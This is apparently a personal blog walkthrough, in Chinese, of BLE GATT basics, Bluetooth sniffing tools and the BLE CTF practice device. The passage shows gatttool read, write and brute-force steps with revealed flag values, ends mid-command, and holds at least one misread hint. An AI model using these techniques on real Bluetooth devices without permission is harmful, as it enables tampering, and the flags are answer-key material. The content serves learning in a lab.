<pre><code>服务器和客户端之间的交互操作都是通过上述的消息ATT PDU 实现的。每个设备可以指定自己设备支持的最大ATT消息长度，我们称为MTU。
</code></pre>
<h3 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h3><p>在BLE GATT 中，每个service、每个characteristic 和每个descriptor 都要一个特定的128比特的UUID表示，就是类似下面一串数字：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000xxxx-0000-1000-8000-00805F9B34FB</span><br></pre></td></tr></table></figure>
<p>为了简化，蓝牙技术联盟定义了16位UUID代替上面基本uuid 的’x’ 的部分。例如，心率测量特性使用0x2a37 作为它的16位uuid，因此它完整的128位uuid为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00002A37-0000-1000-8000-00805F9B34FB</span><br></pre></td></tr></table></figure>
<p>另外，蓝牙技术联盟所用的基本uuid不能用于任何自定义的属性、服务和特性。对于自定义uuid，必须使用另外完整的128位uuid。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>蓝牙安全与攻击案例分析（好文）<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Ojm3LSw8q8H5pAT-JxUyqA">https://mp.weixin.qq.com/s/Ojm3LSw8q8H5pAT-JxUyqA</a><br>网络靶场实战——低功耗蓝牙初探（已保存到金山文档中）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/We8__/article/details/128416397?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-128416397-blog-105454527.235%5Ev38%5Epc_relevant_sort_base1&spm=1001.2101.3001.4242.2&utm_relevant_index=4">https://blog.csdn.net/We8__/article/details/128416397?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-128416397-blog-105454527.235^v38^pc_relevant_sort_base1&amp;spm=1001.2101.3001.4242.2&amp;utm_relevant_index=4</a><br>低功耗蓝牙攻击实用指南<br><a target="_blank" rel="noopener" href="https://delikely.github.io/2018/12/27/%E4%BD%8E%E5%8A%9F%E8%80%97%E8%93%9D%E7%89%99%E6%94%BB%E5%87%BB%E5%AE%9E%E7%94%A8%E6%8C%87%E5%8D%97/">https://delikely.github.io/2018/12/27/%E4%BD%8E%E5%8A%9F%E8%80%97%E8%93%9D%E7%89%99%E6%94%BB%E5%87%BB%E5%AE%9E%E7%94%A8%E6%8C%87%E5%8D%97/</a><br>利用物联网支持的 BLE 智能灯泡安全<br><a target="_blank" rel="noopener" href="https://blog.attify.com/exploiting-iot-enabled-ble-smart-bulb-security/">https://blog.attify.com/exploiting-iot-enabled-ble-smart-bulb-security/</a><br>关于蓝牙的漏洞研究<br><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/wireless/ble/2018/08/01/ble/">https://xuanxuanblingbling.github.io/wireless/ble/2018/08/01/ble/</a><br>esp32 蓝牙 文档（很好的学习资料）<br>《esp32_bluetooth_architecture_cn.pdf》<br>《Assigned Numbers》<br><a target="_blank" rel="noopener" href="https://btprodspecificationrefs.blob.core.windows.net/assigned-numbers/Assigned%20Number%20Types/Assigned_Numbers.pdf">https://btprodspecificationrefs.blob.core.windows.net/assigned-numbers/Assigned%20Number%20Types/Assigned_Numbers.pdf</a></p>
<h1 id="工具与命令使用"><a href="#工具与命令使用" class="headerlink" title="工具与命令使用"></a>工具与命令使用</h1><h2 id="gatttool"><a href="#gatttool" class="headerlink" title="gatttool"></a>gatttool</h2><p>更多命令 <a target="_blank" rel="noopener" href="https://helpmanual.io/man1/gatttool/">https://helpmanual.io/man1/gatttool/</a></p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723231954245.png"></p>
<h2 id="hcitool"><a href="#hcitool" class="headerlink" title="hcitool"></a>hcitool</h2><p>更多命令 <a target="_blank" rel="noopener" href="https://helpmanual.io/man1/hcitool/">https://helpmanual.io/man1/hcitool/</a></p>
<p>查看蓝牙：hciconfig</p>
<p>开启蓝牙：hciconfig hci0 up</p>
<p>蓝牙扫描：hcitool scan&#x2F;hcitool lescan</p>
<p>蓝牙状态：hcitool dev</p>
<p>蓝牙可被扫描：hciconfig -a hci0 piscan</p>
<p>修改蓝牙名称：hciconfig -a hci0 name ‘woshilanya’</p>
<p>&#x3D;&#x3D;hciattach、hcidump 等 hci* 工具套件</p>
<h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p>在Linux中，<code>xxd</code>是一个十六进制和ASCII编码之间转换的命令行工具。它可以用于查看二进制文件的十六进制表示，也可以将十六进制数据还原为原始的二进制数据。</p>
<p><code>xxd</code>命令的基本语法是：</p>
<p>复制代码</p>
<p><code>xxd [选项] [输入文件] [输出文件]</code></p>
<p>以下是一些常用的选项：</p>
<ul>
<li><code>-l &lt;长度&gt;</code>: 指定要显示的字节数。</li>
<li><code>-c &lt;列数&gt;</code>: 指定每行显示的字节数。</li>
<li><code>-g &lt;字节数&gt;</code>: 指定每个十六进制数的字节数，可以是1、2、4或8，默认是2。</li>
<li><code>-u</code>: 使用大写字母显示十六进制数。</li>
<li><code>-ps &lt;sep&gt;</code>: 用指定的分隔符代替默认的空格分隔符。</li>
<li><code>-r</code>: 反向操作，将十六进制转换回二进制数据。</li>
</ul>
<p>例如，要将一个文件”example.txt”以十六进制格式显示，可以运行以下命令：</p>
<p>复制代码</p>
<p><code>xxd example.txt</code></p>
<p>如果你只想显示前面16个字节的内容，可以使用 <code>-l</code> 选项指定长度：</p>
<p>复制代码</p>
<p><code>xxd -l 16 example.txt</code></p>
<p>如果你希望将一个十六进制文件转换回二进制文件，可以使用 <code>-r</code> 选项：</p>
<p>复制代码</p>
<p><code>xxd -r hex_file.txt bin_file</code></p>
<p>请注意，这只是<code>xxd</code>命令的一些基本用法，更多的选项和用法可以通过查看<code>xxd</code>的帮助文档来了解。要查看完整的<code>xxd</code>命令帮助文档，可以在终端中运行：</p>
<p>复制代码</p>
<p><code>man xxd</code></p>
<p>这将显示<code>xxd</code>命令的详细信息，包括所有可用选项和用法示例。</p>
<h2 id="nRF-Connect-lightblue"><a href="#nRF-Connect-lightblue" class="headerlink" title="nRF Connect &amp; lightblue"></a>nRF Connect &amp; lightblue</h2><h2 id="bleah"><a href="#bleah" class="headerlink" title="bleah"></a>bleah</h2><h1 id="蓝牙-sniff-CTF"><a href="#蓝牙-sniff-CTF" class="headerlink" title="蓝牙 sniff &amp; CTF"></a>蓝牙 sniff &amp; CTF</h1><h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><p>普通的BLE嗅探器通常只能捕获其中一个RF通道发送的数据包，无论是广播通道还是数据通道。<br>当捕获广播数据包的时候，会利用跳频机制在（37,38,39）之间不断切换，因此在捕获的时候，可能会丢包。<br>为了捕获连接，嗅探器只能在给定时间嗅探一个连接，切换到两个通信BLE设备交换数据包的RF通道来嗅探。</p>
<h2 id="手机蓝牙抓包"><a href="#手机蓝牙抓包" class="headerlink" title="手机蓝牙抓包"></a>手机蓝牙抓包</h2><p>工具：</p>
<ul>
<li>BLEt调试助手（<a target="_blank" rel="noopener" href="http://www.wch.cn/downloads/BLEAssist_ZIP.html">http://www.wch.cn/downloads/BLEAssist_ZIP.html</a>） &#x2F;</li>
<li>nRF Connect  （<a target="_blank" rel="noopener" href="https://github.com/NordicSemiconductor/Android-nRF-Connect">https://github.com/NordicSemiconductor/Android-nRF-Connect</a>）</li>
</ul>
<h2 id="NRF52832-BLE-抓包"><a href="#NRF52832-BLE-抓包" class="headerlink" title="NRF52832 BLE 抓包"></a>NRF52832 BLE 抓包</h2><p>安装wireshark ，安装python。导入插件，导入profile。</p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220914173115924.png" alt="image-20220914173115924"></p>
<p>点击捕获，刷新，然后就可以看到接口。</p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220914173246414.png" alt="image-20220914173246414"></p>
<p>参考《青风教你学蓝牙:抓包器教程》</p>
<h2 id="CSR4-0-kali-抓包"><a href="#CSR4-0-kali-抓包" class="headerlink" title="CSR4.0 kali 抓包"></a>CSR4.0 kali 抓包</h2><p>抓包设备: SCR8510</p>
<p>hicconfig 查看</p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220914151410101.png" alt="image-20220914151410101"></p>
<p>激活蓝牙设备 ： hciconfig hci1 up</p>
<p>查看蓝牙信息：hciconfig hci1 lestates</p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220914151717385.png" alt="image-20220914151717385"></p>
<p>扫描低功耗蓝牙的MAC地址，<br>问题1： 如果执行扫描显示超时，重新插拔一次 CSR8510。</p>
<blockquote>
<p>C8:F0:9E:A6:C8:D2 BLECTF</p>
</blockquote>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220920224829813.png" alt="image-20220920224829813"></p>
<p>使用命令<code>gatttool -b $MAC --primary</code>  获取蓝牙服务端提供的Service (服务)</p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220920225103860.png" alt="image-20220920225103860"></p>
<p>使用<code>gatttool -b $MAC --characteristics</code>  设备上所有的 characteristics (特征值)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[C8:F0:9E:A6:C8:D2][LE]&gt; characteristics </span><br><span class="line">handle: 0x0002, char properties: 0x20, char value handle: 0x0003, uuid: 00002a05-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0015, char properties: 0x02, char value handle: 0x0016, uuid: 00002a00-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0017, char properties: 0x02, char value handle: 0x0018, uuid: 00002a01-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0019, char properties: 0x02, char value handle: 0x001a, uuid: 00002aa6-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0029, char properties: 0x02, char value handle: 0x002a, uuid: 0000ff01-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x002b, char properties: 0x0a, char value handle: 0x002c, uuid: 0000ff02-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x002d, char properties: 0x02, char value handle: 0x002e, uuid: 0000ff03-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x002f, char properties: 0x02, char value handle: 0x0030, uuid: 0000ff04-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0031, char properties: 0x0a, char value handle: 0x0032, uuid: 0000ff05-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0033, char properties: 0x0a, char value handle: 0x0034, uuid: 0000ff06-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0035, char properties: 0x0a, char value handle: 0x0036, uuid: 0000ff07-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0037, char properties: 0x02, char value handle: 0x0038, uuid: 0000ff08-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0039, char properties: 0x08, char value handle: 0x003a, uuid: 0000ff09-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x003b, char properties: 0x0a, char value handle: 0x003c, uuid: 0000ff0a-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x003d, char properties: 0x02, char value handle: 0x003e, uuid: 0000ff0b-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x003f, char properties: 0x1a, char value handle: 0x0040, uuid: 0000ff0c-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0041, char properties: 0x02, char value handle: 0x0042, uuid: 0000ff0d-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0043, char properties: 0x2a, char value handle: 0x0044, uuid: 0000ff0e-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0045, char properties: 0x1a, char value handle: 0x0046, uuid: 0000ff0f-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0047, char properties: 0x02, char value handle: 0x0048, uuid: 0000ff10-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0049, char properties: 0x2a, char value handle: 0x004a, uuid: 0000ff11-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x004b, char properties: 0x02, char value handle: 0x004c, uuid: 0000ff12-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x004d, char properties: 0x02, char value handle: 0x004e, uuid: 0000ff13-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x004f, char properties: 0x0a, char value handle: 0x0050, uuid: 0000ff14-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0051, char properties: 0x0a, char value handle: 0x0052, uuid: 0000ff15-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0053, char properties: 0x9b, char value handle: 0x0054, uuid: 0000ff16-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle: 0x0055, char properties: 0x02, char value handle: 0x0056, uuid: 0000ff17-0000-1000-8000-00805f9b34fb</span><br><span class="line">[C8:F0:9E:A6:C8:D2][LE]&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="BLE-CTF"><a href="#BLE-CTF" class="headerlink" title="BLE CTF"></a>BLE CTF</h2><p>工具：</p>
<h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>获取20关</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220920225839769.png" alt="image-20220920225839769"></p>
<h3 id="第二题-0x002c"><a href="#第二题-0x002c" class="headerlink" title="第二题 0x002c"></a>第二题 0x002c</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230720235008470.png"></p>
<p>根据题目的提示，可以知道先要读取 0x002e 句柄的值。</p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230720234947028.png"></p>
<p>d205303e099ceff44835<br>把读取到的值 写入 0x002c 中，才能通过这道题。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230721001123680.png"><br>查看答题进度<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230721001234265.png"></p>
<h3 id="第三题-flag3"><a href="#第三题-flag3" class="headerlink" title="第三题 flag3"></a>第三题 flag3</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723223357918.png"></p>
<p>读取0x0030 的值Ascii 值。 让我们提交设备名的MD5的值到0x002c<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723223416919.png"><br>计算 “BLECTF” 的MD5的值  “5cd56d74049ae40f442ece036c6f4f06”<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723223705562.png"></p>
<p>提交到0x002c  ， 取MD5 值得20个字符。（不知道为什么是20个字符）<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723224154227.png"></p>
<h3 id="第四题-flag4"><a href="#第四题-flag4" class="headerlink" title="第四题 flag4"></a>第四题 flag4</h3><p>蓝牙GATT 服务提供一些额外得设备属性。尝试查找通用访问— 设备名称得值。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723224300812.png"><br>chatGTP 的解释<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723231026835.png"></p>
<p>在这个文档里查看Device name 的uuid 的值是 0x2A00，对应的是0x0016<br><a target="_blank" rel="noopener" href="https://btprodspecificationrefs.blob.core.windows.net/assigned-numbers/Assigned%20Number%20Types/Assigned_Numbers.pdf">https://btprodspecificationrefs.blob.core.windows.net/assigned-numbers/Assigned%20Number%20Types/Assigned_Numbers.pdf</a><br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723230701858.png"><br>读取devicename 对应的value的值并转换成 ASCII<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723231249562.png"></p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723231651552.png"></p>
<h3 id="第五题-flag5"><a href="#第五题-flag5" class="headerlink" title="第五题 flag5"></a>第五题 flag5</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723232419155.png"></p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723232431882.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~/t/umap2Plus-master [1|0|0|0]&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x0032|awk -F&quot;:&quot; &#x27;&#123;print $2&#125;&#x27;| tr -d &#x27;&#x27;| xxd -r -p</span><br><span class="line">Write anything here⏎                                                                                      tigerortiger@ubuntu ~/t/umap2Plus-master&gt; echo -n &quot;hello&quot;|xxd -ps</span><br><span class="line">68656c6c6f</span><br><span class="line">tigerortiger@ubuntu ~/t/umap2Plus-master&gt; gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x0032 -n 68656c6c6f</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="第六题-flag6"><a href="#第六题-flag6" class="headerlink" title="第六题 flag6"></a>第六题 flag6</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724215548836.png"><br>直接读取 0x0034 的value<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724215724161.png"><br>让我们在这个句柄中写入 “yo” </p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724220620242.png"></p>
<p>做这一题的时候设备崩溃了。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724222418757.png"></p>
<p>这个题目是考察写入ascii 的值到句柄中。先把ascii 值换成16进制，然后读取句柄的值，在转成16进制提交到0x002c 中。</p>
<h3 id="第七题-flag7"><a href="#第七题-flag7" class="headerlink" title="第七题 flag7"></a>第七题 flag7</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724224359159.png"></p>
<p>直接按照提示读取 0x0036， 将0x07 写入到0x0036<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724224526153.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~&gt; gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Write the hex value 0x07 here</span><br><span class="line">tigerortiger@ubuntu ~ [1]&gt; gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x0036 -n 07</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~&gt; gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x0036</span><br><span class="line">Characteristic value/descriptor: 31 31 37 39 30 38 30 62 32 39 66 38 64 61 31 36 61 64 36 36</span><br><span class="line">tigerortiger@ubuntu ~&gt; echo -n &quot;Characteristic value/descriptor: 31 31 37 39 30 38 30 62 32 39 66 38 64 61 31 36 61 64 36 36 &quot;|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">1179080b29f8da16ad66</span><br><span class="line">tigerortiger@ubuntu ~&gt; echo -n &quot;1179080b29f8da16ad66&quot;|xxd -ps</span><br><span class="line">3131373930383062323966386461313661643636</span><br><span class="line">tigerortiger@ubuntu ~&gt; gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x002c -n 3131373930383062323966386461313661643636</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~&gt; gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:1 /20</span><br></pre></td></tr></table></figure>


<h3 id="第八题-flag8"><a href="#第八题-flag8" class="headerlink" title="第八题 flag8"></a>第八题 flag8</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724230259822.png"></p>
<p>读取0x0038 的值，发现往58 句柄写入0xC9。 58 是整数，转换成16进制是0x0036</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~&gt; gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x0038|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Write 0xC9 to handle 58</span><br><span class="line">tigerortiger@ubuntu ~&gt; gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x0036 -n C9</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~&gt; gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Write the hex value 0x07 here</span><br><span class="line">后面就跟第八题一样</span><br></pre></td></tr></table></figure>

<h3 id="第九题-flag9"><a href="#第九题-flag9" class="headerlink" title="第九题 flag9"></a>第九题 flag9</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724231357813.png"><br>按照提示读取0x003c 的题目，让我们爆破00到ff</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~&gt; gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x003c|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Brute force my value 00 to ff</span><br></pre></td></tr></table></figure>
<p>写一个爆破的脚本，虽然不理解这是什么意思。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725220201508.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x003c|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">933c1fcfa8ed52d2ec05</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; echo -n &quot;933c1fcfa8ed52d2ec05&quot;| xxd -ps</span><br><span class="line">3933336331666366613865643532643265633035</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x002c -n 3933336331666366613865643532643265633035</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:1 /20</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="第十题-flag10"><a href="#第十题-flag10" class="headerlink" title="第十题 flag10"></a>第十题 flag10</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725220415001.png"><br>按照题目的意思是，读取0x003e 一千次。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725220645566.png"><br>写脚本<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725222437415.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">echo &quot;Characteristic value/descriptor: 36 66 66 63 64 32 31 34 66 66 65 62 64 63 30 64 30 36 39 65 &quot;|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">6ffcd214ffebdc0d069e</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; echo &quot;6ffcd214ffebdc0d069e&quot;|xxd -ps</span><br><span class="line">36666663643231346666656264633064303639650a</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x002c -n 3666666364323134666665626463306430363965</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:1 /20</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="第十一题-flag11-没懂notification-是什么意思"><a href="#第十一题-flag11-没懂notification-是什么意思" class="headerlink" title="第十一题 flag11 没懂notification 是什么意思"></a>第十一题 flag11 没懂notification 是什么意思</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725222716234.png"><br>没看懂，监听notification<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725222759027.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x0040 -n 0a --listen</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">Notification handle = 0x0040 value: 35 65 63 33 37 37 32 62 63 64 30 30 63 66 30 36 64 38 65 62 </span><br><span class="line">^C⏎ </span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">echo &quot;35 65 63 33 37 37 32 62 63 64 30 30 63 66 30 36 64 38 65 62&quot;|xxd -ps -r</span><br><span class="line">5ec3772bcd00cf06d8eb</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; echo &quot;5ec3772bcd00cf06d8eb&quot;|xxd -ps</span><br><span class="line">35656333373732626364303063663036643865620a</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x002c -n 3565633337373262636430306366303664386562</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool 